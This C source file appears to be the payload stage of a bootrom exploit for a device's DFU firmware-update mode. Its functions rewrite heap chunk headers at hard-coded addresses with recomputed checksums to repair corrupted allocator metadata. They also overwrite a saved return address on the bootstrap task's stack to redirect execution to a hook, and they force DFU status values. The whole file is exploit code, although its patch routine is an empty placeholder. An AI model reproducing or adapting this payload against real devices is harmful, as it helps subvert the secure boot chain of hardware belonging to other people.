#include "dev/addr.h"
#include "dev/types.h"
#include "bootrom_func.h"

extern unsigned long long get_hook();

PAYLOAD_SECTION
unsigned long long get_en_boot_intf()
{
    return ADDR_EN_BOOT_INTF;
}

PAYLOAD_SECTION
unsigned long long get_boot_entry()
{
    return ADDR_GETBOOT_ENTRY;
}

PAYLOAD_SECTION
void patch()
{
    //TODO
}

PAYLOAD_SECTION
void fix_heap()
{
    struct heap_header *curr = (struct heap_header *) ADDR_HEAP_BASE;
    struct heap_header *header1 = (struct heap_header *) 0x1801b9180;
    struct heap_header *header2 = (struct heap_header *) 0x1801b9200;
    struct heap_header *header3 = (struct heap_header *) 0x1801b9280;

    header1->curr_size = (0x80 / 0x40);
    header1->curr_free = 0;
    header1->prev_free = 0;
    header1->prev_size = (0x840 / 0x40);
    header1->pad_start = 0;
    header1->pad_end = 0;
    calc_chksum(&header1->chksum,
                (unsigned char *) header1 + 0x20,
                32, (void *) ADDR_HEAP_COOKIE);

    header2->curr_size = (0x80 / 0x40);
    header2->curr_free = 0;
    header2->prev_free = 0;
    header2->prev_size = (0x80 / 0x40);
    header2->pad_start = 0;
    header2->pad_end = 0;
    calc_chksum(&header2->chksum,
                (unsigned char *) header2 + 0x20,
                32, (void *) ADDR_HEAP_COOKIE);

    header3->curr_size = (0x80 / 0x40);
    header3->curr_free = 0;
    header3->prev_free = 0;
    header3->prev_size = (0x80 / 0x40);
    header3->pad_start = 0;
    header3->pad_end = 0;
    calc_chksum(&header3->chksum,
                (unsigned char *) header3 + 0x20,
                0x20, (void *) ADDR_HEAP_COOKIE);

    while(1)
    {
        if((long) (curr + curr->curr_size) == ADDR_HEAP_END)
        {
            curr->curr_size--;
            calc_chksum(&curr->chksum,
                    (unsigned char *) curr + 0x20,
                    0x30, (void *) ADDR_HEAP_COOKIE);

            (curr + curr->curr_size)->prev_free = curr->curr_free;
            (curr + curr->curr_size)->prev_size = curr->curr_size;
            (curr + curr->curr_size)->curr_free = 0;
            (curr + curr->curr_size)->curr_size = 1;
            calc_chksum(&(curr + curr->curr_size)->chksum,
                        (unsigned char *) (curr + curr->curr_size) + 0x20,
                        0x20, (void *) ADDR_HEAP_COOKIE);

            break;
        }

        curr += curr->curr_size;
    }

    check_all_chksums();
}

PAYLOAD_SECTION
void entry_sync(uint64_t addr_hook)
{
    uint64_t *bootstrap_sp = ((uint64_t *) ADDR_BOOTSTRAP_TASK + 0x25);
    uint64_t *bootstrap_stack = (uint64_t *) *bootstrap_sp;

    while(1)
    {
        if(*bootstrap_stack == ADDR_GETDFU_EXIT)
        {
            *bootstrap_stack = get_hook();
            break;
        }

        bootstrap_stack++;
    }

    *(ADDR_DFU_RETVAL) = -1;
    *(ADDR_DFU_STATUS) = 1;

    fix_heap();
    event_notify(ADDR_DFU_EVENT);
}

PAYLOAD_SECTION
void entry_async(){}